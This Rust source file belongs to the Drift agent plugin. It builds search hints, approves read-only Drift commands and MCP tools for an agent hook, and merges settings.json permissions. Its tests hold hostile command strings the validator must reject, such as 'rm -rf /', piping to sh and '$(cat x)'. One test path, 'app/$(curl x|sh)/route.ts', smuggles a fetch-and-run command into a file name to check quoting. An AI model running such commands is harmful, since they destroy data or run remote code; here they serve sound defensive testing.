//! "How is X done here?" from an agent's search: when a Grep or Glob is hunting for a
//! convention (auth, validation, errors, routes, ...) in a place Drift has entry points
//! for, one line pointing at `drift card <file>`. Also which Drift commands and MCP
//! tools are read-only lookups the plugin pre-approves.
//!
//! The hint runs before every search, so it reads only a small index written at
//! SessionStart (`.drift/cache/sessions/agent-hints.idx`) and the session state: it
//! never scans. Without the index it says nothing.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use drift_core::RepoFacts;
use drift_mine::report::sanitize;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

/// The index file, beside the session state (pruned with it only if a month old;
/// SessionStart rewrites it).
pub const INDEX_FILE: &str = "agent-hints.idx";
const INDEX_VERSION: u32 = 1;
/// Entry-point files and directories kept in the index (largest repos first lose the
/// smallest directories): it is read before every search.
const MAX_ENTRIES: usize = 2000;
const MAX_DIRS: usize = 4000;
/// The session brief's cap: about 300 tokens at 4 bytes a token.
pub const BRIEF_MAX_BYTES: usize = 1200;

/// What the hint needs, from the last scan.
#[derive(Debug, Default, Serialize, Deserialize, PartialEq)]
pub struct HintIndex {
    pub v: u32,
    /// Files with entry points, by path.
    pub entries: Vec<HintEntry>,
    /// Every directory holding an analysed file: (files under it, entry-point files under it).
    pub dirs: BTreeMap<String, (usize, usize)>,
    /// Every package ("" the root) with its entry points by kind (none: an empty map).
    pub packages: BTreeMap<String, BTreeMap<String, usize>>,
}

#[derive(Debug, Serialize, Deserialize, PartialEq)]
pub struct HintEntry {
    pub path: String,
    /// The file's most common entry-point kind (`http`, `page`, ...).
    pub kind: String,
    /// Its entry points.
    pub n: usize,
    /// Whether one of them has a wrapper or decorator.
    pub guarded: bool,
}

impl HintIndex {
    pub fn build(facts: &RepoFacts) -> Self {
        let inv = drift_mine::security::inventory(facts);
        let mut by_file: BTreeMap<&str, (BTreeMap<&str, usize>, usize, bool)> = BTreeMap::new();
        let mut packages: BTreeMap<String, BTreeMap<String, usize>> = facts
            .files
            .iter()
            .map(|f| (f.package.clone(), BTreeMap::new()))
            .collect();
        for e in &inv.entry_points {
            *packages
                .entry(e.package.clone())
                .or_default()
                .entry(e.kind.clone())
                .or_default() += 1;
            let f = by_file.entry(e.path.as_str()).or_default();
            *f.0.entry(e.kind.as_str()).or_default() += 1;
            f.1 += 1;
            f.2 |= !e.guards.is_empty();
        }
        let mut entries: Vec<HintEntry> = by_file
            .into_iter()
            .map(|(path, (kinds, n, guarded))| HintEntry {
                path: path.to_string(),
                kind: kinds
                    .into_iter()
                    .max_by(|a, b| a.1.cmp(&b.1).then(b.0.cmp(a.0)))
                    .map(|(k, _)| k.to_string())
                    .unwrap_or_default(),
                n,
                guarded,
            })
            .collect();
        entries.truncate(MAX_ENTRIES);
        let mut dirs: BTreeMap<String, (usize, usize)> = BTreeMap::new();
        let is_entry: std::collections::BTreeSet<&str> =
            entries.iter().map(|e| e.path.as_str()).collect();
        for f in &facts.files {
            let entry = usize::from(is_entry.contains(f.path.as_str()));
            for d in ancestors(&f.path) {
                let c = dirs.entry(d.to_string()).or_default();
                c.0 += 1;
                c.1 += entry;
            }
        }
        if dirs.len() > MAX_DIRS {
            // Keep the directories with the most files (ties by path).
            let mut v: Vec<_> = dirs.into_iter().collect();
            v.sort_by(|a, b| b.1.0.cmp(&a.1.0).then(a.0.cmp(&b.0)));
            v.truncate(MAX_DIRS);
            dirs = v.into_iter().collect();
        }
        Self {
            v: INDEX_VERSION,
            entries,
            dirs,
            packages,
        }
    }

    /// The structure part of the session brief (PLAN-R14 C2): packages with their entry
    /// points, then where to ask first, in at most `max_bytes` (the packages listed are
    /// trimmed to fit), with the file it names. `None` when Drift knows no entry point,
    /// or when not even the first-stop line fits.
    pub fn brief(&self, max_bytes: usize) -> Option<(String, String)> {
        let (first, _) = self.target("")?;
        let mut pkgs: Vec<(&String, usize, &BTreeMap<String, usize>)> = self
            .packages
            .iter()
            .map(|(p, k)| (p, k.values().sum::<usize>(), k))
            .collect();
        pkgs.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(b.0)));
        let without = pkgs.iter().filter(|p| p.1 == 0).count();
        let ask = format!(
            "Before reading sibling files to learn how a route, handler, job or component is built here, run `drift card <path>` (MCP `drift_card`; it works for a file that does not exist yet), e.g. `drift card {}`. Read other files only for what it lists under Not known.",
            // One shell word: an agent may run it as printed.
            drift_mine::report::shell_word(&sanitize(&first.path, 160))
        );
        let head = format!(
            "Drift map (facts from this repository, not rules): {} package(s); entry points by package:",
            self.packages.len()
        );
        // Room for the listing, after the head, the first-stop line and the closing count.
        let budget = max_bytes.checked_sub(head.len() + ask.len() + 64)?;
        let mut listed = String::new();
        let mut shown = 0;
        for (p, n, kinds) in pkgs.iter().filter(|p| p.1 > 0) {
            let mut kinds: Vec<(&String, &usize)> = kinds.iter().collect();
            kinds.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
            let item = format!(
                " {} {n} ({});",
                if p.is_empty() {
                    "(root)".to_string()
                } else {
                    sanitize(p, 80)
                },
                kinds
                    .iter()
                    .take(3)
                    .map(|(k, c)| format!("{} {c}", sanitize(k, 24)))
                    .collect::<Vec<_>>()
                    .join(", ")
            );
            if listed.len() + item.len() > budget {
                break;
            }
            listed.push_str(&item);
            shown += 1;
        }
        let with = pkgs.len() - without;
        let rest = match (with - shown, without) {
            (0, 0) => String::new(),
            (0, w) => format!(" {w} without entry points."),
            (m, 0) => format!(" and {m} more."),
            (m, w) => format!(" and {m} more; {w} without entry points."),
        };
        let listed = listed.trim_end_matches(';');
        Some((format!("{head}{listed}.{rest}\n{ask}"), first.path.clone()))
    }

    pub fn load(sessions: &Path) -> Option<Self> {
        let b = std::fs::read(sessions.join(INDEX_FILE)).ok()?;
        let i: Self = serde_json::from_slice(&b).ok()?;
        (i.v == INDEX_VERSION).then_some(i)
    }

    /// The entry-point file to name for a search over `scope` (repo-relative; "" for the
    /// whole repository): `scope` itself when it has entry points, else the best one
    /// under it (one with a guard, then the most entry points, then by path), with how
    /// many entry points of its kind are under `scope`.
    fn target(&self, scope: &str) -> Option<(&HintEntry, usize)> {
        if let Some(e) = self.entries.iter().find(|e| e.path == scope) {
            return Some((e, e.n));
        }
        let under: Vec<&HintEntry> = self
            .entries
            .iter()
            .filter(|e| under(scope, &e.path))
            .collect();
        let best = under.iter().copied().max_by(|a, b| {
            a.guarded
                .cmp(&b.guarded)
                .then(a.n.cmp(&b.n))
                .then(b.path.cmp(&a.path))
        })?;
        let n = under
            .iter()
            .filter(|e| e.kind == best.kind)
            .map(|e| e.n)
            .sum();
        Some((best, n))
    }

    /// Whether `dir` is an entry-point directory: at least half the analysed files under
    /// it have entry points.
    fn is_entry_dir(&self, dir: &str) -> bool {
        self.dirs
            .get(dir)
            .is_some_and(|&(files, entries)| entries > 0 && entries * 2 >= files)
    }
}

/// Directories above `path` ("a/b/c.ts" gives "a", "a/b"), the root left out.
fn ancestors(path: &str) -> impl Iterator<Item = &str> {
    path.match_indices('/').map(move |(i, _)| &path[..i])
}

fn under(scope: &str, path: &str) -> bool {
    scope.is_empty()
        || path
            .strip_prefix(scope)
            .is_some_and(|rest| rest.starts_with('/'))
}

/// Words that name a cross-cutting concern or the structure an agent is asking about.
const HUNT_WORDS: &[&str] = &[
    "auth",
    "authn",
    "authz",
    "authenticate",
    "authenticated",
    "authentication",
    "authorize",
    "authorized",
    "authorization",
    "middleware",
    "guard",
    "depends",
    "validate",
    "validation",
    "validator",
    "schema",
    "error",
    "exception",
    "logger",
    "logging",
    "route",
    "handler",
    "router",
];

fn is_hunt_word(w: &str) -> bool {
    let w = w.to_ascii_lowercase();
    let w = w.as_str();
    HUNT_WORDS.contains(&w) || w.strip_suffix('s').is_some_and(|s| HUNT_WORDS.contains(&s))
}

/// The identifier-like words in `s`, each also split at camelCase and `_` boundaries.
/// Regex escapes (`\b`, `\s`, `\w`, ...) are not words.
fn words(s: &str) -> Vec<String> {
    let mut cleaned = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            chars.next();
            cleaned.push(' ');
        } else {
            cleaned.push(c);
        }
    }
    let mut out = Vec::new();
    for token in cleaned.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$')) {
        if token.is_empty() {
            continue;
        }
        out.push(token.to_string());
        // camelCase and acronyms: `requireAuth` -> require, Auth; `HTTPException` -> HTTP, Exception.
        let cs: Vec<char> = token.chars().collect();
        let mut part = String::new();
        for (i, &c) in cs.iter().enumerate() {
            if c == '_' || c == '$' {
                if !part.is_empty() {
                    out.push(std::mem::take(&mut part));
                }
                continue;
            }
            let prev = i.checked_sub(1).map(|j| cs[j]);
            let next = cs.get(i + 1).copied();
            let boundary = c.is_ascii_uppercase()
                && prev.is_some_and(|p| {
                    p.is_ascii_lowercase()
                        || p.is_ascii_digit()
                        || (p.is_ascii_uppercase() && next.is_some_and(|n| n.is_ascii_lowercase()))
                });
            if boundary && !part.is_empty() {
                out.push(std::mem::take(&mut part));
            }
            part.push(c);
        }
        if !part.is_empty() && part != token {
            out.push(part);
        }
    }
    out
}

/// A plain symbol or string lookup: the pattern is a quoted string, or one identifier
/// (with `\b`, `^`, `$`, a leading `@` or declaration keyword, a trailing `(`) that is
/// not itself a concern word. Grep stays the tool for those.
fn plain_lookup(pattern: &str) -> bool {
    if pattern.contains(['"', '\'', '`']) {
        return true;
    }
    let mut p = pattern.trim();
    for _ in 0..4 {
        let before = p;
        p = p.trim_start_matches('^').trim_end_matches('$');
        p = p.strip_prefix("\\b").unwrap_or(p);
        p = p.strip_suffix("\\b").unwrap_or(p);
        p = p.strip_suffix("\\(").unwrap_or(p);
        p = p.strip_suffix('(').unwrap_or(p);
        p = p.trim_start_matches('@');
        for kw in [
            "def ",
            "class ",
            "function ",
            "fn ",
            "const ",
            "let ",
            "interface ",
            "type ",
            "export ",
            "async ",
        ] {
            p = p.strip_prefix(kw).unwrap_or(p);
        }
        p = p.trim();
        if p == before {
            break;
        }
    }
    let ident = !p.is_empty()
        && p.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '$')
        && !p.starts_with(|c: char| c.is_ascii_digit());
    ident && !is_hunt_word(p)
}

/// Whether a Grep pattern hunts for how a concern is handled.
pub fn hunting_pattern(pattern: &str) -> bool {
    !plain_lookup(pattern) && words(pattern).iter().any(|w| is_hunt_word(w))
}

/// Whether a glob names a concern (`**/*auth*`, `**/middleware.ts`, `src/errors/**`).
fn hunting_glob(glob: &str) -> bool {
    words(glob).iter().any(|w| is_hunt_word(w))
}

/// The directories a glob is over, in repo-relative form under `base`: each indexed
/// directory named by a literal segment after a wildcard (`**/routes/*.ts` names every
/// `.../routes`), then the literal prefix before its first wildcard.
fn glob_dirs(index: &HintIndex, base: &str, glob: &str) -> Vec<String> {
    let join = |a: &str, b: &str| match (a.is_empty(), b.is_empty()) {
        (true, _) => b.to_string(),
        (_, true) => a.to_string(),
        _ => format!("{a}/{b}"),
    };
    let wild = |s: &str| s.contains(['*', '?', '[', '{']);
    let segs: Vec<&str> = glob
        .trim_start_matches("./")
        .split('/')
        .filter(|s| !s.is_empty())
        .collect();
    // The last segment names files, not a directory.
    let dir_segs = &segs[..segs.len().saturating_sub(1)];
    let lead = dir_segs.iter().take_while(|s| !wild(s)).count();
    // The most specific first: directories a later literal segment names, then the prefix.
    let mut out = Vec::new();
    for seg in dir_segs[lead..].iter().filter(|s| !wild(s)) {
        out.extend(
            index
                .dirs
                .keys()
                .filter(|d| under(base, d) && d.rsplit('/').next() == Some(*seg))
                .cloned(),
        );
    }
    out.push(join(base, &dir_segs[..lead].join("/")));
    out
}

/// The target of a search, or `None` when it is no convention hunt or Drift has no
/// entry points there: (scope searched, entry-point file to name, entry points of its
/// kind under the scope).
fn hunt_target<'i>(
    index: &'i HintIndex,
    tool: &str,
    ti: &Value,
    scope: &str,
) -> Option<(String, &'i HintEntry, usize)> {
    let s = |k: &str| ti.get(k).and_then(Value::as_str).unwrap_or("");
    match tool {
        "Grep" => {
            let hunt = hunting_pattern(s("pattern"))
                || (!plain_lookup(s("pattern")) && hunting_glob(s("glob")));
            if !hunt {
                return None;
            }
            let (e, n) = index.target(scope)?;
            Some((scope.to_string(), e, n))
        }
        "Glob" => {
            let glob = s("pattern");
            let dirs = glob_dirs(index, scope, glob);
            let named = hunting_glob(glob);
            dirs.into_iter()
                .filter(|d| named || (!d.is_empty() && index.is_entry_dir(d)))
                .find_map(|d| index.target(&d).map(|(e, n)| (d, e, n)))
        }
        _ => None,
    }
}

/// The one-line hint for a Grep or Glob, and the target it names (for the session's
/// dedupe), or `None` to stay silent.
pub fn hint(index: &HintIndex, input: &Value, root: &Path, cwd: &Path) -> Option<(String, String)> {
    let tool = input.get("tool_name").and_then(Value::as_str)?;
    let ti = input.get("tool_input")?;
    let base = ti
        .get("path")
        .and_then(Value::as_str)
        .map_or_else(|| cwd.to_path_buf(), PathBuf::from);
    let base = if base.is_absolute() {
        base
    } else {
        cwd.join(base)
    };
    let canon = root.canonicalize().ok()?;
    let scope = crate::project::rel_in(&canon, &base.to_string_lossy())?;
    let (scope, e, n) = hunt_target(index, tool, ti, &scope)?;
    // One shell word: an agent may run the command as printed.
    let file = drift_mine::report::shell_word(&sanitize(&e.path, 160));
    let place = if scope.is_empty() {
        "in the repository".to_string()
    } else if scope == e.path {
        "in it".to_string()
    } else {
        format!("under {}/", sanitize(&scope, 160))
    };
    let practices = if crate::has_command("practices") {
        format!(" (or `drift practices --path {file}`)")
    } else {
        String::new()
    };
    Some((
        // The opening the Studio reads the hint by, then what it names of the repository
        // (the kind and place of its entry points), said as data.
        format!(
            "drift knows this: `drift card {file}`{practices} answers how the entry points it names are guarded, validated and structured, with a file to copy. Grep only for what it reports as not known.\n{}{n} {} entry point(s) {place}.",
            crate::agent::FACTS_DATA_LABEL,
            sanitize(&e.kind, 40)
        ),
        e.path.clone(),
    ))
}

/// Drift subcommands that only read: the plugin's PreToolUse hook approves them so
/// they never prompt. `drift practices` reads, except its `promote` subcommand, which
/// writes a convention ([`read_only_drift`] and [`claude_settings`] leave it out).
pub const READ_ONLY_COMMANDS: &[&str] = &["card", "map", "example", "check", "practices"];
/// Drift's read-only MCP tools. Not here: the ones that write, `drift_setup_answer`
/// and `drift_investigate_record` (`.drift/config.yaml`, and an investigation's local
/// findings and gap reports) and `drift_verify_card` (a verdict cache).
pub const READ_ONLY_TOOLS: &[&str] = &[
    "drift_rules_for",
    "drift_example",
    "drift_check",
    "drift_explain",
    "drift_map",
    "drift_card",
    "drift_security",
    "drift_practices",
    "drift_setup_questions",
    "drift_investigate_items",
];

/// The permission entry that keeps the allow list from covering
/// `drift practices promote` ([`claude_settings`]).
pub const PROMOTE_DENY: &str = "Bash(drift practices promote:*)";

/// Whether `cmd` is exactly one read-only Drift lookup (`drift card src/a.ts`): no
/// shell syntax at all (no `;`, `&`, `|`, redirection, expansion, subshell, glob or
/// escape), `drift` itself first, then a read-only subcommand, and no `promote`.
pub fn read_only_drift(cmd: &str) -> bool {
    let cmd = cmd.trim();
    if !cmd
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || " _-./:=@+,%'\"".contains(c))
    {
        return false;
    }
    // Quotes only around plain words: an odd count leaves the shell waiting.
    if cmd.matches('\'').count() % 2 == 1 || cmd.matches('"').count() % 2 == 1 {
        return false;
    }
    let mut w = cmd.split(' ').filter(|s| !s.is_empty());
    if w.next() != Some("drift") {
        return false;
    }
    let Some(sub) = w.next() else { return false };
    READ_ONLY_COMMANDS.contains(&sub) && !w.any(|a| a.trim_matches(['\'', '"']) == "promote")
}

/// Whether `tool` (`mcp__<server>__<tool>`) is one of Drift's read-only MCP tools, from
/// a server whose name says drift.
pub fn read_only_tool(tool: &str) -> bool {
    tool.strip_prefix("mcp__")
        .and_then(|t| t.rsplit_once("__"))
        .is_some_and(|(server, t)| {
            server.to_ascii_lowercase().contains("drift") && READ_ONLY_TOOLS.contains(&t)
        })
}

/// The PreToolUse answer that approves a read-only lookup without a prompt.
pub fn allow() -> Value {
    json!({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
            "permissionDecisionReason": "drift: a read-only Drift lookup, pre-approved by the Drift plugin",
        }
    })
}

/// `.claude/settings.json` permission entries for the same lookups, for a team that
/// does not use the plugin, or for permission modes where a hook cannot approve.
pub fn claude_settings(server: &str) -> Value {
    let mut allow: Vec<String> = READ_ONLY_COMMANDS
        .iter()
        .map(|c| format!("Bash(drift {c}:*)"))
        .collect();
    allow.extend(
        READ_ONLY_TOOLS
            .iter()
            .map(|t| format!("mcp__{server}__{t}")),
    );
    // `Bash(drift practices:*)` would cover `drift practices promote`, which writes a
    // person's decision: denied by name, and a deny wins over an allow.
    json!({ "permissions": { "allow": allow, "deny": [PROMOTE_DENY] } })
}

/// `existing` (a settings.json, possibly empty) with `entries` merged into its
/// `permissions` lists, each entry once. `None` when `existing` is not a JSON object.
pub fn merge_settings(existing: &str, entries: &Value) -> Option<Value> {
    let mut out: Value = if existing.trim().is_empty() {
        json!({})
    } else {
        serde_json::from_str(existing).ok()?
    };
    let perms = out
        .as_object_mut()?
        .entry("permissions")
        .or_insert_with(|| json!({}))
        .as_object_mut()?;
    for (list, add) in entries["permissions"].as_object()? {
        let have = perms
            .entry(list.clone())
            .or_insert_with(|| json!([]))
            .as_array_mut()?;
        for e in add.as_array()? {
            if !have.contains(e) {
                have.push(e.clone());
            }
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn convention_hunts_and_plain_lookups() {
        for p in [
            "auth",
            "Depends",
            "Depends\\(",
            "auth|guard",
            "@app.route",
            "router\\.(get|post)",
            "raise HTTPException",
            "logger\\.",
            "validate",
            "middleware",
            "class .*Error",
            "z\\.object.*schema",
        ] {
            assert!(hunting_pattern(p), "{p}");
        }
        for p in [
            "getUserById",
            "requireAuth",
            "withAuth\\(",
            "\\bValidationError\\b",
            "HTTPException",
            "@UseGuards",
            "def authenticate_user",
            "\"error\"",
            "'Invalid token'",
            "TODO",
            "app.use(",
            "import.*zod",
            "",
        ] {
            assert!(!hunting_pattern(p), "{p}");
        }
        assert!(hunting_glob("**/*auth*"));
        assert!(hunting_glob("**/middleware.ts"));
        assert!(hunting_glob("src/errors/**"));
        assert!(!hunting_glob("**/*.ts"));
        assert!(!hunting_glob("src/components/**/*.tsx"));
    }

    fn index() -> HintIndex {
        let entry = |path: &str, n, guarded| HintEntry {
            path: path.to_string(),
            kind: "http".to_string(),
            n,
            guarded,
        };
        HintIndex {
            v: INDEX_VERSION,
            entries: vec![
                entry("app/api/a/route.ts", 2, true),
                entry("app/api/b/route.ts", 3, false),
                entry("app/api/c/route.ts", 1, true),
            ],
            dirs: [
                ("app", (3, 3)),
                ("app/api", (3, 3)),
                ("app/api/a", (1, 1)),
                ("app/api/b", (1, 1)),
                ("app/api/c", (1, 1)),
                ("lib", (10, 0)),
                ("src", (20, 0)),
            ]
            .into_iter()
            .map(|(k, v)| (k.to_string(), v))
            .collect(),
            packages: [
                ("", BTreeMap::new()),
                ("app", [("http".to_string(), 6)].into()),
            ]
            .into_iter()
            .map(|(k, v)| (k.to_string(), v))
            .collect(),
        }
    }

    #[test]
    fn the_brief_lists_packages_and_where_to_ask_within_its_cap() {
        let (b, named) = index().brief(BRIEF_MAX_BYTES).unwrap();
        assert_eq!(named, "app/api/a/route.ts");
        assert_eq!(
            b,
            "Drift map (facts from this repository, not rules): 2 package(s); entry points by package: app 6 (http 6). 1 without entry points.\nBefore reading sibling files to learn how a route, handler, job or component is built here, run `drift card <path>` (MCP `drift_card`; it works for a file that does not exist yet), e.g. `drift card app/api/a/route.ts`. Read other files only for what it lists under Not known."
        );
        // Many packages: capped, the rest counted.
        let mut big = index();
        for i in 0..400 {
            big.packages.insert(
                format!("packages/some-long-package-name-{i:03}"),
                [("http".to_string(), 1), ("job".to_string(), 2)].into(),
            );
        }
        let (b, _) = big.brief(BRIEF_MAX_BYTES).unwrap();
        assert!(b.len() <= BRIEF_MAX_BYTES, "{}", b.len());
        assert!(b.contains(" more; 1 without entry points."), "{b}");
        // A smaller share of the cap (practice lines took the rest): fewer packages.
        let (small, _) = big.brief(700).unwrap();
        assert!(
            small.len() <= 700 && small.len() < b.len(),
            "{}",
            small.len()
        );
        // Not even the first-stop line fits, or nothing known: no brief.
        assert_eq!(big.brief(200), None);
        assert_eq!(HintIndex::default().brief(BRIEF_MAX_BYTES), None);
    }

    fn target(tool: &str, ti: Value, scope: &str) -> Option<(String, String, usize)> {
        let i = index();
        hunt_target(&i, tool, &ti, scope).map(|(s, e, n)| (s, e.path.clone(), n))
    }

    #[test]
    fn targets_name_an_entry_point_file_where_drift_has_one() {
        let a = "app/api/a/route.ts".to_string();
        assert_eq!(
            target("Grep", json!({"pattern": "auth"}), ""),
            Some((String::new(), a.clone(), 6))
        );
        assert_eq!(
            target("Grep", json!({"pattern": "auth"}), "app/api/b/route.ts"),
            Some(("app/api/b/route.ts".into(), "app/api/b/route.ts".into(), 3))
        );
        // Nothing known under lib/; a plain lookup anywhere.
        assert_eq!(target("Grep", json!({"pattern": "auth"}), "lib"), None);
        assert_eq!(target("Grep", json!({"pattern": "withAuth"}), ""), None);
        // A glob over an entry-point directory, by prefix or by a literal segment.
        assert_eq!(
            target("Glob", json!({"pattern": "app/api/**/*.ts"}), ""),
            Some(("app/api".into(), a.clone(), 6))
        );
        assert_eq!(
            target("Glob", json!({"pattern": "**/api/*/route.ts"}), ""),
            Some(("app/api".into(), a.clone(), 6))
        );
        assert_eq!(
            target("Glob", json!({"pattern": "**/*.ts"}), "app"),
            Some(("app".into(), a.clone(), 6))
        );
        // Not an entry-point directory, and no concern named.
        assert_eq!(target("Glob", json!({"pattern": "src/**/*.ts"}), ""), None);
        assert_eq!(target("Glob", json!({"pattern": "**/*.ts"}), ""), None);
        // A concern named over the whole repository.
        assert_eq!(
            target("Glob", json!({"pattern": "**/*auth*"}), ""),
            Some((String::new(), a, 6))
        );
    }

    #[test]
    fn only_read_only_drift_commands_are_approved() {
        for c in [
            "drift card app/api/a/route.ts",
            "drift map",
            "drift map --file 'src/a b.ts' --json",
            "drift example src/new.ts",
            "drift practices --path src/a.ts --json",
            "drift check --format json",
        ] {
            assert!(read_only_drift(c), "{c}");
        }
        for c in [
            "drift practices promote P-1a2b3c",
            "drift card a.ts; rm -rf /",
            "drift card a.ts && curl x",
            "drift card $(cat x)",
            "drift card `x`",
            "drift card a.ts > out",
            "drift map | sh",
            "drift review --accept D-1",
            "drift init",
            "DRIFT_CACHE_DIR=/tmp drift card a.ts",
            "drift --root / card a.ts",
            "drift card 'a.ts",
            "drift card a.ts\nrm x",
            "drifter card a",
        ] {
            assert!(!read_only_drift(c), "{c}");
        }
        assert!(read_only_tool("mcp__drift__drift_card"));
        assert!(read_only_tool("mcp__plugin_drift_drift__drift_map"));
        assert!(!read_only_tool("mcp__drift__drift_verify_card"));
        assert!(!read_only_tool("mcp__other__drift_card"));
        assert!(!read_only_tool("Bash"));
    }

    #[test]
    fn settings_merge_keeps_what_is_there_and_adds_each_entry_once() {
        let entries = claude_settings("drift");
        let existing = r#"{"model": "x", "permissions": {"allow": ["Bash(npm test:*)", "Bash(drift map:*)"]}}"#;
        let merged = merge_settings(existing, &entries).unwrap();
        assert_eq!(merged["model"], "x");
        let allow = merged["permissions"]["allow"].as_array().unwrap();
        assert_eq!(allow[0], "Bash(npm test:*)");
        assert_eq!(
            allow.iter().filter(|e| *e == "Bash(drift map:*)").count(),
            1
        );
        assert!(allow.contains(&json!("mcp__drift__drift_card")));
        // Nothing is asked: no entry names a command this build does not have.
        assert!(merged["permissions"].get("ask").is_none());
        // The one writing form the allow list would cover is denied, once.
        assert_eq!(merged["permissions"]["deny"], json!([PROMOTE_DENY]));
        assert_eq!(merge_settings(&merged.to_string(), &entries), Some(merged));
        assert_eq!(merge_settings("[]", &entries), None);
    }

    /// Pins review item 3 and 4 (area 4): the hint named a committed path in a command
    /// unquoted (`drift card app/$(curl x|sh)/route.ts`, which a shell runs), and quoted
    /// the repository's names without the data label. The path is one shell word now,
    /// and what the hint names of the repository comes after the label.
    #[test]
    fn the_hint_quotes_the_path_it_names_and_labels_the_repositorys_names() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let hostile = "app/$(curl x|sh)/route.ts";
        let index = HintIndex {
            v: INDEX_VERSION,
            entries: vec![HintEntry {
                path: hostile.to_string(),
                kind: "http".to_string(),
                n: 1,
                guarded: true,
            }],
            dirs: [("app", (1, 1)), ("app/$(curl x|sh)", (1, 1))]
                .into_iter()
                .map(|(k, v)| (k.to_string(), v))
                .collect(),
            packages: [("".to_string(), BTreeMap::new())].into_iter().collect(),
        };
        let input = json!({
            "tool_name": "Grep",
            "tool_input": { "pattern": "auth", "path": root.to_string_lossy() },
        });
        let (line, target) = hint(&index, &input, &root, &root).unwrap();
        assert_eq!(target, hostile);
        assert!(
            line.starts_with("drift knows this: `drift card 'app/$(curl x|sh)/route.ts'`"),
            "{line}"
        );
        assert_eq!(
            line.lines().nth(1),
            Some(crate::agent::FACTS_DATA_LABEL.trim_end()),
            "{line}"
        );
        // The brief's example command is one shell word too.
        let (brief, _) = index.brief(BRIEF_MAX_BYTES).unwrap();
        assert!(
            brief.contains("e.g. `drift card 'app/$(curl x|sh)/route.ts'`."),
            "{brief}"
        );
    }
}
